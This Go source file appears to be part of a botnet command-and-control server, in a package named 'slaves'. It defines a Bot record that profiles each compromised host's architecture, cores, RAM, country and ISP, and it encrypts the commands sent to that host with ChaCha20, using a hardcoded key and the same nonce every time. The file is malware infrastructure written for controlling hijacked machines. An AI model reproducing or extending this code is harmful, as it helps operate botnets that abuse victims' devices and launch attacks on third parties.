package slaves

import (
	"crypto/cipher"
	"net"

	"golang.org/x/crypto/chacha20"
)

type Bot struct {
	uid     int
	conn    net.Conn
	version byte
	Source  string
	Arch    string
	Cores   int
	Ram     int
	Country string
	ISP     string
	
	cipher cipher.Stream
	nonce  []byte
}


var encryptionKey = []byte{
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
	0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
}

func NewBot(conn net.Conn, version byte, source string, arch string, cores int, ram int, country string, isp string) *Bot {
	return &Bot{-1, conn, version, source, arch, cores, ram, country, isp, nil, nil}
}



func (b *Bot) InitEncryption(remoteAddr string) error {
	
	
	b.nonce = make([]byte, 12)

	
	authMagic := []byte{0x4A, 0x8F, 0x2C, 0xD1}

	
	copy(b.nonce[0:4], authMagic)
	copy(b.nonce[4:8], authMagic)
	copy(b.nonce[8:12], authMagic)

	
	cipher, err := chacha20.NewUnauthenticatedCipher(encryptionKey, b.nonce)
	if err != nil {
		return err
	}

	b.cipher = cipher
	return nil
}

func (b *Bot) QueueBuf(buf []byte) {
	if len(buf) < 2 {
		
		return
	}

	
	
	lengthPrefix := buf[0:2]
	payload := buf[2:]

	
	if b.cipher != nil && len(payload) > 0 {
		encrypted := make([]byte, len(payload))
		b.cipher.XORKeyStream(encrypted, payload)
		payload = encrypted
	}

	
	_, err := b.conn.Write(lengthPrefix)
	if err != nil {
		return
	}

	if len(payload) > 0 {
		_, err = b.conn.Write(payload)
		if err != nil {
			return
		}
	}
}
